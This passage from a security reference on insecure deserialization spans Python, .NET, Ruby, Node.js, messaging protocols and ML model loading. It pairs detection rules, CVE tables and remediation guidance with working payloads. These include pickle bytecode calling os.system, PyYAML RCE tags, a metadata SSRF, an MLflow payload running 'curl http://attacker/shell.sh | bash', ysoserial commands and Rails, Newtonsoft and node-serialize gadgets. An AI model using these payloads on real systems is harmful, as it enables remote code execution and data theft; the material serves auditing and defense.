            "subprocess.call([\"/bin/sh\",\"-i\"])'",
        ))

# RAW PVM BYTECODE
raw_pickle = (
    b'\x80\x04'           # Protocol 4
    b'\x95\x1d\x00\x00\x00\x00\x00\x00\x00'  # Frame
    b'\x8c\x02os'         # SHORT_BINUNICODE "os"
    b'\x8c\x06system'     # SHORT_BINUNICODE "system"
    b'\x93'               # STACK_GLOBAL (lookup os.system)
    b'\x8c\x02id'         # SHORT_BINUNICODE "id"
    b'\x85'               # TUPLE1
    b'\x52'               # REDUCE (call os.system("id"))
    b'.'                  # STOP
)
```

RestrictedUnpickler always fails: `find_class()` only called for GLOBAL/STACK_GLOBAL opcodes. BUILD opcode calls `__setstate__()` without it. No safe way to unpickle untrusted data. Use JSON.

### PyYAML Exploitation

```yaml
# RCE via os.system (FullLoader/UnsafeLoader)
!!python/object/apply:os.system ["id"]

# subprocess.check_output
!!python/object/apply:subprocess.check_output [["id"]]

# exec() -- multi-command
!!python/object/apply:builtins.exec
  - |
    import os
    os.system('id')

# SSRF
!!python/object/apply:urllib.request.urlopen
  ["http://169.254.169.254/latest/meta-data/"]

# DNS PROBE (SAFE)
!!python/object/apply:urllib.request.urlopen
  ["http://deser-test.attacker.com"]
```

Loader safety: `yaml.unsafe_load()` / `UnsafeLoader` = Critical. `yaml.full_load()` / `FullLoader` = High. `yaml.safe_load()` / `SafeLoader` = Safe.

Always use: `data = yaml.safe_load(user_input)`

### ML Model Supply Chain Attacks

| Framework | Unsafe API | Safe Alternative | CVE |
|---|---|---|---|
| **PyTorch** | `torch.load(f)` | `torch.load(f, weights_only=True)` + SafeTensors | CVE-2025-32434, CVE-2024-37059 |
| **Scikit-learn/Joblib** | `joblib.load(f)` | Don't load untrusted | CVE-2024-37052 |
| **NumPy** | `numpy.load(f, allow_pickle=True)` | `numpy.load(f)` (safe since 1.16.3) | CVE-2019-6446 |
| **MLflow** | Model artifact load | Scan + sandbox | CVE-2024-37052-37060 |
| **Hugging Face** | pickle-based models | SafeTensors format | JFrog 2024 (100+ malicious) |
| **TensorFlow** | `load_model()` with Lambda | Use standard layers | CVE-2024-37058 |
| **LangChain** | `_load_from_pickle` | — | CVE-2024-37055 |
| **Pandas** | `read_pickle()` | `read_csv()`, `read_json()` | — |

MLflow exploitation (CVE-2024-37052-37060):
```
1. Gain write access to MLflow artifact store (API, S3 misconfiguration)
2. Overwrite python_model.pkl:
   class Evil:
       def __reduce__(self):
           return (os.system, ('curl http://attacker/shell.sh | bash',))
   pickle.dump(Evil(), open('model.pkl', 'wb'))
3. Legitimate pipeline loads model -> RCE in production inference
```

Scale: JFrog (Feb 2024): 100+ malicious models on Hugging Face. Protect AI (2026): 352,000 unsafe issues across 51,700 models.

```python
# SafeTensors -- the correct alternative (no code execution possible)
from safetensors.torch import load_file, save_file
save_file(model.state_dict(), "model.safetensors")
state_dict = load_file("model.safetensors")
model.load_state_dict(state_dict)
```

### Celery and Airflow Pipeline Vectors

```python
# VULNERABLE Celery config
CELERY_TASK_SERIALIZER = 'pickle'
CELERY_ACCEPT_CONTENT = ['pickle', 'json']

# SAFE Celery config
CELERY_TASK_SERIALIZER = 'json'
CELERY_RESULT_SERIALIZER = 'json'
CELERY_ACCEPT_CONTENT = ['json']  # CRITICAL: reject pickle at worker

# Airflow XCom: enable_xcom_pickling defaulted to True in 1.x -> RCE
# Fixed: 2.0 (False default), 3.0 (pickling removed entirely)
# CVE-2023-50943: Airflow 2.8.0 bypass, fixed in 2.8.1
```

---

## Part 7: .NET Deserialization

### BinaryFormatter Status

| .NET Version | Status |
|---|---|
| .NET 5 | Obsolete warning |
| .NET 7 | Throws in ASP.NET |
| .NET 8 | Disabled by default |
| **.NET 9** | **Removed -- always throws PlatformNotSupportedException** |

### ysoserial.net Gadget Chains

| Chain | Formatter | Key Class |
|---|---|---|
| **TypeConfuseDelegate** | BinaryFormatter | SortedSet + delegate confusion |
| **ObjectDataProvider** | BinaryFormatter | WPF ObjectDataProvider |
| **WindowsIdentity** | BinaryFormatter | Claims-based identity |
| **ActivitySurrogateSelector** | BinaryFormatter | ActivitySurrogateSelector |
| **PSObject** | BinaryFormatter | PowerShell PSObject |
| **ViewState** | ObjectStateFormatter | ASP.NET ViewState |
| **DataSet** | Various | CVE-2020-1147 |

BinaryFormatter detection: `00 01 00 00 00 FF FF FF FF` / Base64: `AAEAAAD/////`

### ViewState Exploitation

```
Step 1: Detect __VIEWSTATE in HTML
Step 2: Check MAC -- web.config: <pages enableViewStateMac="false" />
        Test: modify ViewState, submit -- if accepted, MAC is off -> DIRECT INJECTION

Step 3: Obtain machine key (if MAC enabled)
  - Path traversal to web.config
  - Default/weak keys from known defaults list
  - Error page disclosure

Step 4: Generate payload
ysoserial.exe --plugin ViewState \
  --generator TypeConfuseDelegate \
  --cmd "cmd /c whoami" \
  --validationalg SHA1 \
  --validationkey <key> \
  --decryptionalg AES \
  --decryptionkey <key> \
  --path "/vulnerable-page.aspx" \
  --apppath "/" \
  --islegacy
```

### Newtonsoft.Json TypeNameHandling

```json
{
    "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
    "MethodName": "Start",
    "MethodParameters": {
        "$type": "System.Collections.ArrayList, mscorlib",
        "$values": ["cmd", "/c calc.exe"]
    },
    "ObjectInstance": {
        "$type": "System.Diagnostics.Process, System"
    }
}
```

Vulnerable: `TypeNameHandling.All`, `.Objects`, `.Arrays`, `.Auto`. Fix: Keep default `TypeNameHandling.None`.

### Telerik UI (CVE-2019-18935, CVSS 9.8)

```
Step 1: CVE-2017-9248 -- Recover encryption key (dp_crypto tool)
        Dialog handler key derivation is predictable

Step 2: CVE-2019-18935 -- Forge payload
        RadAsyncUpload handler accepts encrypted JSON
        With known key, forge encrypted payload with ysoserial.net gadget -> RCE

Detection: /Telerik.Web.UI.DialogHandler.aspx
           /Telerik.Web.UI.WebResource.axd
Fix: Telerik R1 2020 (2020.1.114)+
```

---

## Part 8: Ruby and Node.js

### Ruby Marshal

```ruby
# DANGEROUS -- arbitrary Ruby object reconstruction
obj = Marshal.load(untrusted_data)
# NO safe subset of Marshal. NO allowed_classes parameter.
# Universal gadget chains using ONLY stdlib/RubyGems:
# Gem::Requirement, Gem::Version, Gem::Resolver, Net::WriteAdapter
# Works: Ruby 2.x, 3.x, 3.4 -- NO extra dependencies needed

# Magic bytes: \x04\x08 / Base64 prefix: BAg
```

Rails CVEs:
| CVE | CVSS | Root Cause |
|---|---|---|
| **CVE-2013-0156** | 10.0 | XML `type="yaml"` -> YAML.load |
| **CVE-2019-5420** | 9.8 | Predictable `secret_key_base` in dev mode |
| **CVE-2022-32224** | 9.8 | YAML.unsafe_load on DB columns (second-order: SQLi -> DB -> deser) |

CVE-2013-0156 attack (Pre-auth RCE on ALL Rails 2.x and 3.x):
```
POST /resource HTTP/1.1
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<user type="yaml">
--- !ruby/hash:ActionController::Routing::RouteSet::NamedRouteCollection
? |
  <%=`id`%>
: !ruby/struct
  foo: bar
</user>
```

Fix: `config.action_dispatch.cookies_serializer = :json  # Rails 7+ default`

### Node.js -- node-serialize (CVE-2017-5941)

```javascript
// node-serialize uses eval() for function reconstruction
var serialize = require('node-serialize');

var payload = '{"rce":"_$$ND_FUNC$$_function(){' +
  'require(\'child_process\').exec(\'id\',' +
  'function(e,o){/* exfil o */})}()"}';

serialize.unserialize(payload);  // eval() -> IIFE executes -> RCE
// Status: ABANDONED library -- do not use
```

### Prototype Pollution -> RCE

```javascript
// Payload: {"__proto__": {"shell": true, "NODE_OPTIONS": "--require /proc/self/environ"}}

// Prevention:
function safeMerge(target, source) {
    for (let key of Object.keys(source)) {
        if (key === '__proto__' || key === 'constructor' || key === 'prototype') continue;
        target[key] = source[key];
    }
}
// Node.js flag: node --disable-proto=delete app.js
```

---

## Part 9: Protocol-Level Deserialization

### AMF/BlazeDS (CVE-2017-5641, CVSS 9.8)

```
Attack: POST to /messagebroker/amf with crafted AMF3 message
AMF3 Externalizable objects: readExternal() fires on deserialization
Same gadget chains as ObjectInputStream (CC, Spring, etc.)
Affected: BlazeDS <= 4.7.2, VMware vCenter 6.0/6.5, Cisco ISE, Adobe LiveCycle/ColdFusion

for endpoint in /messagebroker/amf /flex/amf /amfphp/gateway; do
    curl -s -o /dev/null -w "%{http_code}" -H "Content-Type: application/x-amf" \
      "http://target${endpoint}"
done
```

### RabbitMQ/AMQP (CVE-2016-2173 -- Spring AMQP)

```
Attack:
  1. Publish to RabbitMQ queue:
     Content-Type: application/x-java-serialized-object
     Body: [ysoserial gadget chain bytes]
  2. Spring AMQP SimpleMessageConverter deserializes -> RCE
     (Consumer often runs with elevated privileges)

Access vectors: guest/guest (localhost), management UI :15672, AMQP :5672, SSRF
```

### Kafka Connect JNDI (CVE-2023-25194 / CVE-2025-27818)

```json
{
  "connector.class": "...",
  "sasl.jaas.config": "com.sun.security.auth.module.JndiLoginModule required
    user.provider.url=\"ldap://attacker:1389/obj\"
    useFirstPass=\"true\" serviceName=\"x\";"
}
// Worker performs SASL JNDI lookup -> LDAP returns ysoserial gadget -> RCE
// Fix: -Dorg.apache.kafka.disallowed.login.modules=JndiLoginModule (Kafka 3.4+ default)
```

### Hazelcast Cluster Attacks

| CVE | Severity | Root Cause |
|---|---|---|
| CVE-2016-10750 | Critical | Cluster join deserializes untrusted data |
| CVE-2022-36437 | 9.1 | Connection handler flaw |
| CVE-2025-30065 | Critical | Hazelcast SQL: parquet-avro Avro schema deserialization |

---

## Part 10: Cross-Cutting Vectors

### Second-Order Deserialization

```
Pattern: Attacker stores malicious serialized data via INPUT A
         Application later reads and deserializes via PROCESS B

CVE-2025-24813 (Tomcat, CISA KEV):
  1. Attacker uses Partial PUT to write serialized gadget to default servlet path
  2. Tomcat path-equivalence (/ -> .) maps filename to session format
  3. Subsequent JSESSIONID lookup triggers session deserialization -> blind RCE
  Timeline: PoC within 30 hours; 4 attacking IPs within 7 days

Common second-order paths:
  - Upload model -> inference pipeline loads with torch.load
  - Write to cache (Redis/Memcached) -> app reads and deserializes
  - SQLi -> write YAML to DB -> read path deserializes (CVE-2022-32224)
  - Publish to message queue -> worker deserializes with pickle/Java
```

### Blind Exploitation Techniques

| Technique | Accuracy | Requirements |
|---|---|---|
| **URLDNS** | High | DNS egress allowed |
| **HTTP callback** | High | HTTP egress allowed |
| **Sleep/Timing** | Medium | Measurable response time |
| **SerialDOS (CPU exhaustion)** | Medium-High | No dependency needed |
| **Error-based** | Low-Medium | Error messages visible |

```bash
# Sleep-based: measure response time
java -jar ysoserial.jar CommonsCollections6 "sleep 7" | base64 -w0
# >7s response = CC on classpath, deserialization confirmed
```

### JNDI Pivoting Chain

```
Internet -> Target:8080 (deser) -> Internal:389 (LDAP) -> Internal:1099 (RMI)
  
Target deserializes JdbcRowSetImpl
  -> JNDI lookup to ldap://internal-ldap:389/obj
    -> LDAP returns Reference pointing to internal server
      -> Target loads class from internal codebase -> RCE with internal network access
```

---

## Part 11: Detection Rules

### Semgrep Rules

```yaml
rules:
  - id: java-objectinputstream
    patterns:
      - pattern: |
          ObjectInputStream $OIS = ...;
          ... $OIS.readObject();
    message: "ObjectInputStream.readObject() on potentially untrusted data"
    severity: ERROR
    metadata: {cwe: CWE-502}

  - id: java-jackson-defaulttyping
    pattern-either:
      - pattern: $M.enableDefaultTyping(...)
      - pattern: $M.activateDefaultTyping(..., ObjectMapper.DefaultTyping.EVERYTHING, ...)
      - pattern: $M.activateDefaultTyping(..., ObjectMapper.DefaultTyping.NON_FINAL, ...)
    severity: ERROR

  - id: java-fastjson-autotype
    pattern-either:
      - pattern: JSON.parseObject($DATA, ...)
      - pattern: JSON.parse($DATA, ...)
      - pattern: ParserConfig.getGlobalInstance().setAutoTypeSupport(true)
    severity: ERROR

  - id: java-snakeyaml-unsafe
    patterns:
      - pattern: new Yaml()
      - pattern-not-inside: new Yaml(new SafeConstructor(...))
    severity: ERROR

  - id: java-shiro-default-key
    pattern: $KEY = "kPH+bIxk5D2deZiIxcaaaA=="
    severity: ERROR

  - id: python-pickle-load
    pattern-either:
      - pattern: pickle.loads(...)
      - pattern: pickle.load(...)
      - pattern: joblib.load(...)
      - pattern: pandas.read_pickle(...)
    severity: ERROR

  - id: python-yaml-unsafe
    pattern-either:
      - pattern: yaml.load(...)
      - pattern: yaml.unsafe_load(...)
    severity: ERROR

  - id: python-torch-unsafe
    patterns:
      - pattern: torch.load(...)
      - pattern-not: torch.load(..., weights_only=True, ...)
    severity: ERROR

  - id: php-unserialize-unsafe
    patterns:
      - pattern: unserialize($DATA)
      - pattern-not: unserialize($DATA, ['allowed_classes' => false])
    severity: ERROR

  - id: csharp-binaryformatter
    pattern-either:
      - pattern: new BinaryFormatter()
      - pattern: new SoapFormatter()
      - pattern: new NetDataContractSerializer()
    severity: ERROR

  - id: csharp-typenamehandling
    pattern-either:
      - pattern: TypeNameHandling = TypeNameHandling.All
      - pattern: TypeNameHandling = TypeNameHandling.Objects
      - pattern: TypeNameHandling = TypeNameHandling.Auto
    severity: ERROR

  - id: ruby-marshal-load
    pattern-either:
      - pattern: Marshal.load(...)
      - pattern: YAML.unsafe_load(...)
    severity: ERROR
```

### Suricata/Network Detection Rules

```
alert http any any -> any any (
    msg:"ET EXPLOIT Java Serialized Object in HTTP";
    content:"|ac ed 00 05 73 72 00|";
    sid:2814812; rev:3;
)

alert http any any -> any any (
    msg:"ET EXPLOIT Apache Commons Collections Serialized Object";
    content:"|ac ed 00 05|";
    content:"commons.collections";
    sid:2814813; rev:2;
)

alert tcp $HOME_NET any -> $EXTERNAL_NET 389 (
    msg:"NCC RIFT Outbound LDAP from Internal (JNDI stage-two)";
    flow:established,to_server;
    sid:21003738; rev:1;
)

alert tcp $HOME_NET any -> $EXTERNAL_NET 1099 (
    msg:"NCC RIFT Outbound RMI from Internal (JNDI stage-two)";
    flow:established,to_server;
    sid:21003739; rev:1;
)
```

### YARA Rules

```yara
rule Java_Deserialization_Gadget_Stream {
    meta:
        description = "Detects ysoserial gadget chains in serialized Java streams"
        severity = "critical"
    strings:
        $magic = { AC ED 00 05 }
        $cc_invoker = "org.apache.commons.collections.functors.InvokerTransformer"
        $cc_chained = "org.apache.commons.collections.functors.ChainedTransformer"
        $cc_lazymap = "org.apache.commons.collections.map.LazyMap"
        $cc_tiedmap = "org.apache.commons.collections.keyvalue.TiedMapEntry"
        $templates = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"
        $beanutils = "org.apache.commons.beanutils.BeanComparator"
        $spring_aop = "org.springframework.aop"
        $rome = "com.sun.syndication.feed.impl.ObjectBean"
    condition:
        $magic at 0 and any of ($cc_*, $templates, $beanutils, $spring_aop, $rome)
}

rule Shiro_RememberMe_Exploit {
    meta:
        description = "Detects Apache Shiro rememberMe deserialization payload"
    strings:
        $cookie = "rememberMe=" ascii
        $magic_b64 = "rO0AB" ascii
        $deleteMe = "rememberMe=deleteMe" ascii
    condition:
        $cookie and ($magic_b64 or $deleteMe)
}
```

### Sigma Rules

```yaml
title: Java Process Spawning a Remote Unix Shell
status: stable
level: critical
logsource:
    category: process_creation
    product: linux
detection:
    selection_parent:
        ParentImage|endswith:
            - '/java'
            - '/javaw'
    selection_child:
        Image|endswith:
            - '/sh'
            - '/bash'
            - '/dash'
        CommandLine|contains:
            - '-i'
            - '-c'
    condition: selection_parent and selection_child
```

### Elastic EQL

```
sequence by host.id with maxspan=1m
  [process where event.type == "start" and
    process.parent.name == "java" and
    process.name in ("bash", "sh", "cmd.exe", "powershell.exe")]
  [network where event.type == "connection" and
    process.name == "java" and
    destination.port in (389, 1389, 1099, 53, 5353)]
```

### WAF Traffic Signatures

| Pattern | Confidence |
|---|---|
| `\xac\xed\x00\x05` in body | Critical |
| `rO0AB` in parameters/cookies | Critical |
| `H4sIAAA` in parameters (gzip+b64 Java) | High |
| `O:\d+:"` in cookies/params | High |
| `!!python/object` in body | Critical |
| `!!javax.script` in body | Critical |
| `"@type"\s*:` in JSON body | High |
| `"@class"\s*:` in JSON body | High |
| `${jndi:` in any field | Critical |
| `phar://` in file path | High |
| Large `rememberMe=` cookie | Medium-High |
| `Content-Type: application/x-java-serialized-object` | Critical |
| `Content-Type: application/x-amf` | High |

Stage-two IOCs (reliable, not easily evaded):
- JVM process (java/javaw) spawning shell (sh/bash/cmd/powershell)
- Outbound connections to LDAP (389/1389), RMI (1099), JRMP (random high port)
- DNS lookups to unusual domains from app server
- New processes spawned by web/app server process

### JVM Forensic Analysis

```bash
# Acquire heap dump
jmap -dump:format=b,file=heap.hprof <pid>

# OQL queries for gadget artifacts (Eclipse MAT)
SELECT t FROM com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl t
WHERE t._bytecodes != null AND t._name = "Pwnr"

SELECT * FROM org.apache.commons.collections.functors.InvokerTransformer
SELECT * FROM org.apache.commons.collections.functors.ChainedTransformer
SELECT * FROM javax.naming.InitialContext

# JFR deserialization telemetry (JDK 11+)
java -XX:StartFlightRecording=filename=recording.jfr,settings=default ...
jfr print --events jdk.Deserialization recording.jfr
# Records: filterConfigured, filterStatus (ALLOWED/REJECTED/UNDECIDED),
#          class, arrayLength, depth, references, bytesConsumed

jfr print --events jdk.Deserialization recording.jfr | grep "REJECTED"

# Log analysis
grep "InvalidClassException: filter status: REJECTED" *.log
grep "ClassNotFoundException" app.log | sort | uniq -c | sort -rn | head -20
grep -E "javax\.naming\.(InitialContext|lookup)" *.log
```

---

## Part 12: CVE Reference Database

### Critical CVEs with CVSS Scores

| CVE | Component | CVSS | Affected | Fixed In | KEV | Root Cause |
|---|---|---|---|---|---|---|
| CVE-2015-4852 | WebLogic T3 | 9.8 | WLS 10.3.6-12.2.1 | Oracle patch | Yes | T3 deserialization |
| CVE-2016-4437 | Apache Shiro | 9.8 | <= 1.2.4 | 1.2.5 (+ change key) | Yes | Hardcoded AES key |
| CVE-2017-5641 | BlazeDS | 9.8 | <= 4.7.2 | 4.7.3 | No | AMF deserialization |
| CVE-2017-7525 | jackson-databind | 9.8 | < 2.6.7.1 | 2.6.7.1+ | No | Default typing + TemplatesImpl |
| CVE-2017-9805 | Struts 2 REST | 9.8 | 2.1.2-2.5.12 | 2.5.13 | Yes | XStream deserialization |
| CVE-2017-18349 | Fastjson | 9.8 | <= 1.2.24 | 1.2.25 | No | autoType direct |
| CVE-2018-15133 | Laravel | 8.1 | < 5.6.30 | 5.6.30 | No | APP_KEY cookie unserialize |
| CVE-2019-6446 | NumPy | 9.8 | < 1.16.3 | 1.16.3 | No | allow_pickle=True default |
| CVE-2019-17571 | Log4j 1.x | 9.8 | All 1.2.x | EOL | No | SocketServer deserialization |
| CVE-2019-18935 | Telerik UI | 9.8 | < 2020.1.114 | 2020.1.114 | No | Dialog handler deser |
| CVE-2020-1948 | Apache Dubbo | 9.8 | < 2.7.7 | 2.7.7 | No | Hessian2 RPC deserialization |
| CVE-2020-1147 | .NET Framework | 7.8 | Multiple | July 2020 | No | DataSet/DataTable XML |
| CVE-2021-44228 | Log4j 2 | **10.0** | 2.0-beta9-2.14.1 | 2.17.1 | Yes | JNDI lookup in messages |
| CVE-2021-45046 | Log4j 2 | 9.0 | 2.15.0 | 2.16.0 | Yes | Thread Context Map bypass |
| CVE-2022-1471 | SnakeYAML | 9.8 | < 2.0 | 2.0 | No | Constructor arbitrary types |
| CVE-2022-25845 | Fastjson | 9.8 | 1.2.25-1.2.83 | safeMode=true | No | autoType shutdown bypass |
| CVE-2022-32224 | Rails ActiveRecord | 9.8 | < 5.2.8.1 | 5.2.8.1, 7.0.3.1 | No | YAML.unsafe_load on DB columns |
| CVE-2023-25194 | Kafka Connect | 8.8 | < 3.4.0 | 3.4.0 | No | SASL JAAS JNDI |
| CVE-2023-46604 | ActiveMQ | 9.8 | < 5.15.16 | 5.15.16+ | Yes | OpenWire class instantiation |
| CVE-2024-37052-60 | MLflow | 8.8-9.8 | < 2.14.3 | 2.14.3 | No | Pickle model deserialization |
| CVE-2025-24813 | Apache Tomcat | 9.8 | < 9.0.99 | 9.0.99+ | Yes | Partial PUT + session deser |
| CVE-2025-32434 | PyTorch | 9.3 | < 2.6.0 | 2.6.0 | No | weights_only=True bypass |
| CVE-2025-54920 | Apache Spark | Critical | <= 3.5.4 | 3.5.5 | No | History Server Jackson polymorphism |
| CVE-2026-16723 | Fastjson 1.x | 9.0 | 1.2.68-1.2.83 | **No 1.x fix** | No | autoType-free RCE |
| CVE-2026-54512 | jackson-databind | 8.1 | < 2.18.8 | 2.18.8+ | No | PTV generic parameter bypass |
| CVE-2026-54513 | jackson-databind | 8.1 | < 2.18.8 | 2.18.8+ | No | PTV array element bypass |

### Real-World Incidents

**WebLogic T3 (CVE-2015-4852):** Triggered industry-wide Java deserialization security review. Post-exploit: coin miners, ransomware, APT backdoors.

**Log4Shell (CVE-2021-44228):** 3+ billion affected devices. Hours after disclosure: nation-state + ransomware. Required four releases (2.15.0 -> 2.17.1). IOC: outbound LDAP/RMI from app servers.

**ActiveMQ OpenWire (CVE-2023-46604):** TCP 61616. Exploited by HelloKitty ransomware, TellYouThePass, Kinsing crypto miners. 7,249 exposed instances; 3,329 vulnerable (Shadowserver/Rapid7).

**Tomcat Partial PUT (CVE-2025-24813):** Second-order pattern. PoC within 30 hours; 4 attacking IPs within 7 days. CISA KEV.

### HackerOne Bounty Examples

| Report | Program | Bounty |
|---|---|---|
| PHP unserialize() cookie -> remote shell | Pornhub | **$20,000** |
| Deserialization at /media/hls | Redtube | **$10,000** |
| Kafka Connect JNDI injection | IBM | **$5,000** |
| Jackson unsafe deserialization | Various | **$4,500** |
| CVE-2025-24813 Tomcat RCE | Apache | **$4,323** |
| SnakeYAML constructor RCE | Various | **$1,000** |

---

## Part 13: Remediation

### Priority Order

| Priority | Remediation | Rationale |
|---|---|---|
| **1** | Eliminate native object deserialization of untrusted input | Fundamental unsafe mechanism |
| **2** | Replace with schema-based formats (JSON, Protobuf) | Removes type ambiguity |
| **3** | Parse into explicit DTOs | Eliminates polymorphic resolution |
| **4** | Strict type ALLOWLISTING (not denylist) | Denylists are repeatedly bypassed |
| **5** | HMAC integrity BEFORE deserialization | Prevents payload modification |
| **6** | Authenticated encryption (AES-GCM, not AES-CBC) | Integrity + confidentiality |
| **7** | Remove unnecessary gadget libraries | Reduces chain availability |
| **8** | Update all dependencies | Applies vendor fixes |
| **9** | Runtime filters (JEP 290) as defense-in-depth | Last-resort barrier |
| **10** | Least-privilege workers | Limits exploitation impact |

### Minimum Safe Version Floor (2026)

| Technology | Minimum Safe Version | Critical Fix |
|---|---|---|
| **jackson-databind** | >= 2.18.8 / 2.21.4 / 3.1.4 | CVE-2026-54512/54513 PTV bypass |
| **Fastjson** | **Migrate to 2.x** (no 1.x fix) | CVE-2026-16723 autoType-free RCE |
| **SnakeYAML** | >= 2.0 | CVE-2022-1471 Constructor RCE |
| **XStream** | >= 1.4.20 | Allowlist by default (1.4.18+) |
| **Apache Tomcat** | >= 9.0.99 / 10.1.35 / 11.0.3 | CVE-2025-24813 |
| **Apache ActiveMQ** | >= 5.15.16 / 5.16.7 / 5.17.6 / 5.18.3 | CVE-2023-46604 |
| **Log4j 2** | >= 2.17.1 (Java 8+) / 2.12.4 (Java 7) / 2.3.2 (Java 6) | Log4Shell complete |
| **Apache Shiro** | >= 1.4.2 | SHIRO-721 padding oracle (AES-GCM) |
| **Apache Dubbo** | >= 2.7.15 / 3.0.5 | Hessian deserialization chain |
| **Apache Spark** | >= 3.5.5 | CVE-2025-54920 History Server |
| **Apache Kafka** | >= 3.9.1 / 4.0.0 | CVE-2025-27818 LdapLoginModule |
| **PyTorch** | >= 2.6.0 | CVE-2025-32434 + weights_only default |
| **PyYAML** | >= 6.0 | CVE-2020-14343 |
| **Celery** | >= 4.0.1 | JSON default serializer |
| **Ruby (Psych)** | >= 3.1 (Psych 4.0) | YAML.load safe by default |
| **Rails** | >= 7.0.3.1 | JSON cookie serializer + CVE-2022-32224 |
| **Telerik UI** | >= 2020.1.114 | CVE-2019-18935 |
| **.NET** | >= .NET 9 | BinaryFormatter removed |
| **Airflow** | >= 3.0 | XCom pickling removed |
| **Hazelcast** | >= 3.11 + allowlist | CVE-2016-10750 |
| **MLflow** | >= 2.14.3 | CVE-2024-37052-37060 |

---

## Part 14: Tools Reference

### Offensive Tools

| Tool | Purpose | Usage |
|---|---|---|
| **ysoserial** | Java gadget chain generation | `java -jar ysoserial.jar <chain> "<cmd>"` |
| **JYso** | Modern ysoserial fork (more chains) | `java -jar JYso.jar -g <chain> -p <cmd>` |
| **ysoserial.net** | .NET gadget chain generation | `ysoserial.exe --generator <chain> --cmd <cmd>` |
| **PHPGGC** | PHP POP chain generation | `phpggc <Framework>/RCE1 system <cmd>` |
| **marshalsec** | JNDI reference server + multi-format | `java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://attacker/#Evil"` |
| **BaRMIe** | RMI service enumeration | `java -jar BaRMIe.jar -enum target 1099` |
| **remote-method-guesser (rmg)** | RMI vulnerability scanning | `java -jar rmg.jar enum target 1099` |
| **GadgetInspector** | Automated Java gadget chain discovery | ASM bytecode + taint analysis |
| **Tabby** | Neo4j-based gadget chain mining | `java -jar tabby.jar --isFull --target /path/to/libs/` |
| **SerializationDumper** | Java stream parser/analyzer | `java -jar SerializationDumper.jar -r serialized.bin` |
| **HeySerial** | Mandiant deser detection payloads | `python3 HeySerial.py --mode detect --callback http://detector.internal` |
| **ShiroExploit** | Shiro rememberMe exploitation | Automates key testing + payload delivery |
| **pickletools** | Pickle opcode disassembler | `python3 -c "import pickletools; pickletools.dis(open('data.pkl','rb'))"` |
| **ModelScan** | ML model security scanning | `modelscan -p /path/to/model.pkl` |

### Defensive Tools

| Tool | Purpose |
|---|---|
| **Eclipse MAT** | JVM heap dump analysis (OQL queries for gadget artifacts) |
| **JFR (Java Flight Recorder)** | Runtime deserialization telemetry (jdk.Deserialization events) |
| **CodeQL** | Multi-language SAST for deserialization sinks |
| **Semgrep** | Pattern-based SAST rules |
| **Sigma** | Cross-platform process-level detection rules |
| **Suricata** | Network IDS with deserialization signatures |
| **YARA** | File/memory pattern matching for gadget artifacts |
| **Volatility** | Memory forensics for post-exploitation analysis |
| **SafeTensors** | Safe ML model format (replaces pickle-based) |

---

## Part 15: Assessment Methodology

### Prioritized Audit Checklist

Phase 1 -- Reconnaissance:
```
Identify language, framework, version
Map serialization libraries in dependency tree:
  Java: CC, CB, Spring, Groovy, Hibernate, ROME, Fastjson, Jackson, SnakeYAML, XStream
  PHP: Laravel/Symfony/WordPress/Magento
  Python: pickle, YAML, ML frameworks
  .NET: BinaryFormatter, Newtonsoft, ViewState
Scan ports: 1099 (RMI), 7001 (T3), 61616 (OpenWire), 20880 (Dubbo)
Check for AMF endpoints (/messagebroker/amf)
Check for Shiro (rememberMe cookie)
Check for Telerik UI (/Telerik.Web.UI.DialogHandler.aspx)
```

Phase 2 -- Entry Point Mapping:
```
Catalog all deserialization API calls
Map pre-auth vs post-auth entry points
Identify direct sources: cookies, POST body, URL params, headers
Identify indirect sources: cache, queue, DB, session store, model files
Check for Fastjson @type / Jackson @class in JSON APIs
Check for YAML !! type tags
```

Phase 3 -- Safe Verification Protocol:
```
Stage 1: FORMAT -- examine raw bytes, never deserialize to identify format
Stage 2: CODE-PATH -- logging at call site, confirm stack trace reaches deserializer
Stage 3: TYPE-POLICY -- craft harmless unexpected-type object, check if accepted
Stage 4: LIFECYCLE -- instrumented callbacks (logging only, no side-effects)
Stage 5: SIDE-EFFECT CONFIRMATION -- DNS callback (URLDNS) or HTTP callback ONLY
         NEVER: system commands, file operations, reverse shells
Stage 6: NEGATIVE CONTROL -- apply fix, repeat stages 3-5, confirm rejection
Stage 7: REGRESSION TEST -- automated test for CI/CD
```

### Root-Cause Variant Analysis (after finding one vulnerability)

```
 1. Other callers of the same deserialization API
 2. Shared utility wrappers that internally deserialize
 3. Alternate input formats (XML endpoint alongside JSON)
 4. Legacy endpoints (old API versions without protections)
 5. Background workers (same data, different config, elevated privileges)
 6. Queue consumers (different consumers, different restrictions)
 7. Backup/restore paths (more permissive deserialization)
 8. ML model loaders (all paths that load models)
 9. Session handlers (file, DB, cache -- different serialization configs)
10. Error/fallback paths (less secure fallback implementations)
11. Different environments (dev/staging with weaker config)
12. Cross-service flows (data consumed by multiple services)
13. Same library in different components (one configured safely, one not)
14. Transitive dependencies (SnakeYAML pulled in by Spring Boot)
```

### What Invalidates a Finding

1. Self-produced, integrity-verified state (HMAC-sign -> verify -> deserialize) -- unless key leaked
2. Internal-only serialization -- same trust domain, no external input path
3. Schema-validated, type-restricted parsing -- JSON into fixed DTO, no polymorphism
4. Authenticated encryption (AES-GCM) with proper key management
5. JEP 290 allowlist with `!*` terminal -- but only covers ObjectInputStream
6. `JSON.parse()` without custom revivers -- standard JSON parsing is safe
7. `unserialize()` with `['allowed_classes' => false]` -- if properly set
8. ViewState with MAC enabled and machine key not leaked

---

## Part 16: Research References

Standards:
- CWE-502: https://cwe.mitre.org/data/definitions/502.html
- OWASP Deserialization Cheat Sheet: https://cheatsheetseries.owasp.org/
- OWASP A08:2021: https://owasp.org/Top10/A08_2021

JEP/Platform:
- JEP 290 (Deserialization Filters): https://openjdk.org/jeps/290
- JEP 415 (Context-Specific Deserialization Filters): https://openjdk.org/jeps/415

Key Research Papers:
- Haken, "Automated Discovery of Deserialization Gadget Chains" -- Black Hat US 2018
- Chen et al., "Tabby: Automated Gadget Chain Detection" -- IEEE/IFIP DSN 2023
- Zhang et al., "FLASH: Precise Gadget Chain Mining" -- USENIX Security 2025
- Kreyssig & Bartel, "Sleeping Giants: Dormant Chains" -- ACM 2025 (26.08% of 533 Java deps have dormant gadget chains)
